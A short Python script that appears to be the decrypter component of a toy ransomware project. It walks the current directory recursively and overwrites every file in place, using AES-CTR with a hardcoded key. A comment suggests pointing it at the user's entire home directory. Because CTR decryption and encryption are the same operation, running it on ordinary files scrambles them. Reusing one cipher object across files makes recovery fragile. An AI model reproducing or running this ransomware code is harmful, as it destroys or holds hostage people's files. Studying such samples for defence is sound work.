#!/usr/bin/python3

import os
import pyaes

key = b'0123456789ABCDEF'	# 16 bytes
aes = pyaes.AESModeOfOperationCTR(key)	# aes object to encrypt data

def decrypt_file(aes, file_name):
	with open(file_name, "rb") as f:
		encrypted_content = f.read()
		decrypted_content = aes.decrypt(encrypted_content)
		with open(file_name, "wb") as f:
			f.write(decrypted_content)

#home = os.path.expanduser('~') use this to decrypt all the user's file, but the key is still needed
for currentpath, folders, files in os.walk('.'):	# lists the current directory and saves output
	for file in files:	# takes only the files, not the directories
		if "ran_decrypter" not in str(file):
			try:
				# concats the currentpath with the file name
				decrypt_file(aes, os.path.join(currentpath, file))	
			except:
				continue
